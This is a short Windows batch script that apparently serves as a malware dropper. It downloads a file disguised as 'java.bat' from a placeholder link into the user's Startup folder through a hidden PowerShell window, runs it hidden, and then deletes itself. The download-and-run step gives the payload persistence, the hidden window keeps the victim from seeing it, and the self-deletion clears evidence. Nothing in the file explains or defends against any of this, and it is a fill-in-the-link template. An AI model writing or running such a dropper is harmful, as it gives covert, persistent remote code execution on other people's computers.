@echo off
set "file=%0"
set "strt=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
set "url=PASTE_RAW_LINK_TO_java.bat"
set "fname=java.bat"
cd %strt%
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri %url% -Outfile %fname%";
powershell -NoProfile -WindowStyle Hidden -Command "& '%strt%%fname%'"
del %file%
